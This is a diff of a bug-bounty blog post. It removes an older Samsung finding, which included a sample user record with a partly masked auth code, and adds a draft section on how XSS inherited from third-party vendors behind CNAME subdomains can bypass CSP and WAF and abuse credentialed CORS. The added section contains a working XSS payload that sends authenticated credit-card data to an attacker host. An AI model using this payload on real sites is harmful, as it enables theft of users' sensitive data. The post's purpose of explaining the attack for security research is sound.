@@ -69,85 +69,119 @@ After understanding the basics, we can dive deeper into the threat and attack mo
 
 ![threat](/images/threat.png)
 
+As we approach the threats and attack models phase, we need to understand that the main attack vectors we will look for are **Client Side Vulnerabilities**, this should make sense by now as we are attacking the company subdomain which is being served as an alias to third party service, in other words:
 
-The page supplied every user which used the login form with his account, with the following details:
+Achieveing RCE on the target would actually mean that we have remote code execution on the vendor's server
+Achieving SSRF on the target would actually mean that we have Server Side Request Forgery from the vendor's IP
+Achieveing XXE on the target would actually mean that we have XML External Entity attack on the vendor's server
+
+Those attacks are severe and can affect the subdomain we are targeting, but as for the impact we are going for to the actual company we are targeting, it will still remain within the same attack models that we can achieve from Client Side Vulnerabilities on the specific subdomain.
+
+I believe that Subdomain takeovers and Dangling dns records are wide known and understood with the community, there are bunch of great tutorials and explanations on these attacks and It's not the main discusstion area of the blog, yet it has to be mentioned and I'll share on the reconnaissance my methodology targeting and automatic the process of finding those.
+
+![tko](/images/tko.png)
+
+![dangling](/images/dangling.png)
+
+Now, let's dive into the main part of the talk.
+
+Client side vulnerabilities such as Cross Site Scripting and Open Redirects are often considered the most common bugs to be found by bug bounty hunters, as such many defence measures are being integrated and considered by companies todays such as implementing CSP (Content-Security-Policy), Deploying a WAF (Web Application Firewall), strict regex controls and sanitizing user input on all fields at all costs (Almost an impossible task).
+
+Those solutions are good, although there are many WAF and CSP Bypasses which are being discovered from time to time, it will mostly do good job with protecting your companies domain from the straight forward attacks.
+
+**But**,
+When we integrate 3rd party service to our domain by pointing to it with a CNAME or A record, we are serving an alias of the vendors website, and the defense measures which we have taken throught the entire development process are no longer effective.
+
+Upon integration we are being 100% dependent on the vendors security policy regarding vulnerabillities.
+
+And this is where the **"Vulnerability Inheritance"** part comes to play, whenever we decide to integrate a new service, we will inherit it's entire security flaws to be served under our domain.
+
+Let's take a quick look on the matter:
+
+Assume we have found Stored XSS on a third party vendor, let's say on .welearn.com, and the company which we are targeting - target.com has a subdomain named study.target.com which points to target.welearn.com, target.com is well protected with strict CSP in place and up to date WAF.
+
+Because study.target.com is a CNAME, it won't have any of these protections inplace, which could have blocked the XSS we have found on the 3rd party vendor.
+
+Now, we will navigate to the subdomain and execute the XSS, as we could have anticipated it's affecting website as well as the vendors website, and the document.domain of the execution is being changed accordingly. 
+
+![xss](/images/xss.png)
+
+That's nice, so we found a vulnerability on a subdomain of our target.com company, and we have done so without tackling any of the defense in depth security measures being implemented on their domains. it's already a valid vulnerability if the company has wildcard domain inscope for assessment.
+
+As I have encountered from time to time with my assessments, often the targeted companies won't realize the impact for such vulnerabilities, and they can issue a generic response as:
+
+"Nice find, although the subdomain you have targeted is affecting 3rd party service which isn't under our control, and there is no impact by doing so."
+
+The vulnerability itself indeed cannot be resolved by the company which we target, and they best mitigation considering the severity is to take down the website for maintanence until the vendor will fix it's flows.
+
+Regarding the impact, it's subjective to the companies design and implementations, and it could be used as a chain to more severer actions.
+
+**Bypassing CORS protections**
+
+To those who are unfamilliar with the **Cross Origin Resource Sharing** mechanism:
+
+Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any other origins (domain, scheme, or port) than its own from which a browser should permit loading of resources.
+
+Upon examining the main functions of our target website, if we come across the following set of headers and there is sensitive data being returned on the page, we defintly should stop and investigate what happens:
 
 ```javascript
-{"userId":150,
-"login":"example@samsung.com",
-"authCode":"aaa13QIsoczffAF6YvAOJkuzXXXXXXXXXXXXXXXXXXXXXXX",
-"fullName":"Israel Israeli",
-"email":"example@samsung.com",
-"locale":"ko","timezone":"Asia/Seoul",
-"datetimePattern":"YYYY-MM-DD HH:mm",
-"statusId":3,"epid":null,
-"loginFailCount":0,
-"orgId":null,
-"deleteYn":"N",
-"createUserId":4,
-"createDate":"2020-10-17T05:44:47Z",
-"updateUserId":null,
-"updateDate":null,
-"lastAuthCodeUpdateDate":"2020-10-17T05:44:47Z",
-"token":null,
-"dept":null,
-"empYn":null,
-"reqRole":null}
+Access-Control-Allow-Origin: https://galnagli.com
+Access-Control-Allow-Credentials: true
 ```
 
-There were approximatly 200 users, including administrators.
+When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the `*` wildcard.
 
-![samsung_creds](/images/samsung_creds.gif)
+We want to make a request with the Access-Control-Allow-Credentials: true header, as it would allow fetching data with the user credentials attached (as authenticated personal).
 
-Now we need to figure out how the authCode is implemented on the application we are testing?
+Targets who set their CORS policy could have it assigned as "Wildcard" whenever dealing with requests which doesn't require authentication.
+And as defense mechanism they would allow specifing the origin on authenticated requests only to be scope for the targets subdomains, such as 
 
-After issuing the login functioniallity from account.samsung.com we can observe that the following request is being initiated:
+```javascript
+*.galnagli.com
+```
 
-![code](/images/code.png)
+It means that if we want to initiate a request from a subdomain of our target, we will specify it's name on the Allow-Origin header, which will look like the following:
 
-Replacing dumped auth code with the one I have issued allowed me to bypass the restriction and access the application as the victim account.
+```javascript
+Access-Control-Allow-Origin: https://study.galnagli.com
+Access-Control-Allow-Credentials: true
+```
 
-![K.O](/images/giphy.webp)
+Now, as we have discovered Cross Site Scripting vulnerability on that subdomain, and although it occurres because of the 3rd party vendor misconfigurations, the origin of execution is being tied to our subdomain, which is inscope of making credential requests to the main domain as per our target configuration.
 
-### Impact
+We can use our XSS to fetch sensitive information which is being stored on the parent domain by issuing a script similar to:
 
-- [ ] Accessing an administrator only web app supplying credentials of samsung employees and the system/admin of the system
+```javascript
+<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://galnagli.com/creditcard.json',true); 
+req.withCredentials = true;
+req.send();
 
-- [ ] Email addresses and full names of samsung employees using the application
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+</script>
+```
 
-### Remediation
+Storing this as the Cross Site Scripting payload will send to our attacker controlled server the creditcard.json authenticated response for each visitor who visits the affected subdomain and executes the script.
 
-The issue was fixed by samsung's security team while issuing a 403 error when trying to access the page as unauthorized personal
 
-### Timeline
+**Cookies exfiltration**
 
-- [ ] Issue found and reported on samsung's mobile bug bounty platform - 12.12.2020
-- [ ] Issue assigned to security analyst - 14.12.2020
-- [ ] Issue fixed - 15.12.2020
-- [ ] Report has been moved from samsung mobile department as its not a service being operated by them - 15.12.2020
-- [ ] Recieved a "Thanks" letter from security@samsung.com team, which are not rewarding any bounties for findings - 17.12.2020
+**Business Logic Errors**
 
-![lucky](/images/lucky.jpeg)
+**Open Redirect**
 
-![thanks](/images/thanks.png)
+**Account Takeover**
 
-### Conclusion
+**SSRF Bypass**
 
-Although I didn't recieve any bounty from the finding, and the fact that I could earn the "thanks" letter from samsung by reporting a low severity issue as well, it was nice to find a critical misconfiguration on such a big company from what seemed to be pretty static page.
+### Reconnaissance
 
-It makes you understand that the intersting parts when engaging with bug bounty programs are the unseen ones :-)
+### Practical exploitations
 
-## Thanks for sticking out!
-
-Hope you enjoyed reading my writeup, Sharing the blog could be nice and I hope you discovered new ways of approching a target from my blog :-)
-
-You can find me on:
-
-- [ ] Twitter: <https://twitter.com/naglinagli>
-- [ ] H1: <https://hackerone.com/nagli>
-- [ ] BugCrowd: <https://bugcrowd.com/Nagli>
-- [ ] Linkedin: <https://www.linkedin.com/in/galnagli>
-
-![thanks2](/images/seal.jpg)
+### Takeaways
 
 
